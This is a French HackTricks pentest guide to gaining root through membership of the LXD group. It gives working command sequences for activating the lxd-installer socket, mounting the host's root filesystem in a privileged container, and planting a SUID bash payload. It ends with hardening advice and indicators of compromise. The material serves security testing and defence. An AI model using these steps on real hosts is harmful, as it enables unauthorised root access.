# Groupe lxd/lxc - Élévation de privilèges

{{#include ../../../banners/hacktricks-training.md}}

L’appartenance au groupe de gestion LXD de l’hôte (normalement _**lxd**_) peut ouvrir une voie vers root en permettant le contrôle total du daemon.<sup>[[1]](#references)</sup> Il s’agit du même problème de frontière de confiance que celui décrit pour les [sockets de contrôle d’exécution](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) et les [montages de l’hôte inscriptibles](../../containers-namespaces/container-security/sensitive-host-mounts.md) : l’accès à l’API de gestion peut suffire, même lorsque le processus actuel ne se trouve pas déjà dans un conteneur.<sup>[[1]](#references)</sup>

## Activation du socket `lxd-installer` sur Ubuntu

Ne partez pas du principe que l’appartenance au groupe `lxd` est sans risque simplement parce que le snap LXD est absent. Sur Ubuntu Server 24.04 et les versions ultérieures, le paquet `lxd-installer` préinstallé expose `/run/lxd-installer.socket` avec `root:lxd` comme propriétaire et le mode `0660`. Une connexion active `lxd-installer@.service` en tant que root, qui installe le snap LXD sans mot de passe sudo ni autorisation polkit ; certaines versions du wrapper omettent également leur invite de confirmation lorsque l’entrée standard n’est pas un TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Inspectez à la fois l’appartenance au groupe du compte et le service activé par socket :<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Un test autorisé du groupe `lxd` peut activer l’installateur via le wrapper `lxc` habituel ou en se connectant directement au socket. Cette dernière méthode montre que l’ACL du socket Unix, et non l’invite du wrapper, constitue la véritable limite d’autorisation :<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Une fois le daemon disponible, poursuivez avec les techniques de conteneur privilégié ci-dessous.<sup>[[10]](#references)[[11]](#references)</sup>

## Exploitation sans Internet

### Method 1

Vous pouvez télécharger une image Alpine à utiliser avec LXD depuis un dépôt de confiance.
Le serveur d’images LXD de Canonical publie des builds quotidiens : [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Récupérez simplement **lxd.tar.xz** et **rootfs.squashfs** du build le plus récent (le nom du répertoire correspond à la date).<sup>[[8]](#references)</sup>

Vous pouvez également installer distrobuilder sur votre machine en suivant les [instructions du projet](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Téléversez **incus.tar.xz** (**lxd.tar.xz** si vous avez téléchargé depuis le serveur d’images Canonical) et **rootfs.squashfs**, puis importez l’image et créez un conteneur.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Si vous obtenez cette erreur _**Erreur : aucun pool de stockage trouvé. Veuillez en créer un nouveau**_\
> Exécutez **`lxd init`**, configurez un pool de stockage par défaut, puis **répétez** le bloc de commandes précédent.<sup>[[2]](#references)</sup>

Enfin, démarrez le conteneur et ouvrez un shell root sur le système de fichiers de l’hôte :<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Comme l’UID 0 de cette instance privilégiée n’est pas remappé, il peut créer un payload SUID appartenant à l’hôte via la racine de l’hôte montée. Cela achève le pivot du conteneur vers l’hôte, au lieu de laisser l’opérateur dans un shell de conteneur :<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Placez le payload sur un système de fichiers qui respecte SUID. Un `/tmp` séparé est souvent monté avec l’option `nosuid` et peut ne pas être accessible via un bind mount non récursif de `/` de l’hôte. Un chemin tel que `/rootbash` sur le système de fichiers racine de l’hôte est donc plus fiable pour cette preuve.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Construisez une image Alpine et démarrez-la avec le flag `security.privileged=true`, qui mappe le root du conteneur sur le root de l’hôte ; monter `/` expose alors le système de fichiers de l’hôte dans le conteneur.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Effet secondaire d’AppArmor à l’échelle de l’hôte

Le démarrage du snap LXD peut également écrire dans `/run/sysctl.d/zz-lxd.conf` et définir `kernel.apparmor_restrict_unprivileged_userns` et `kernel.apparmor_restrict_unprivileged_unconfined` sur `0`. Cela affaiblit les restrictions d’Ubuntu sur les espaces de noms utilisateur non privilégiés pour tous les utilisateurs locaux. Lors de l’évaluation de l’hôte, notez donc les valeurs avant et après l’activation de LXD.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit et renforcement

Considérez l’appartenance au groupe `lxd` comme une attribution des privilèges root. Le retrait d’un membre qui n’en a pas besoin prend effet pour les nouvelles sessions de connexion ; purger `lxd-installer` ou masquer son socket supprime uniquement le chemin d’installation à la demande et ne restreint **pas** un utilisateur qui peut déjà accéder à un daemon LXD installé.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Les indicateurs utiles de compromission incluent les instances LXD avec `security.privileged=true`, les périphériques de disque dont la valeur de `source` est `/`, les connexions inattendues à `/run/lxd-installer.socket`, les nouveaux fichiers SUID et le passage des sysctls AppArmor ci-dessus de `1` à `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Comment renforcer la sécurité de LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Conteneurs et machines virtuelles LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Comment copier et importer des images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Comment créer des images avec distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Définition d’image Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script de build lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Serveur d’images LXD](https://images.lxd.canonical.com/)
- [9] [Type : disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Rapport et PoC de STAR Labs sur l’élévation de privilèges via le groupe LXD](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Du vieux vin dans une nouvelle bouteille : le root via le groupe LXD, vieux d’une décennie, réarmé](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
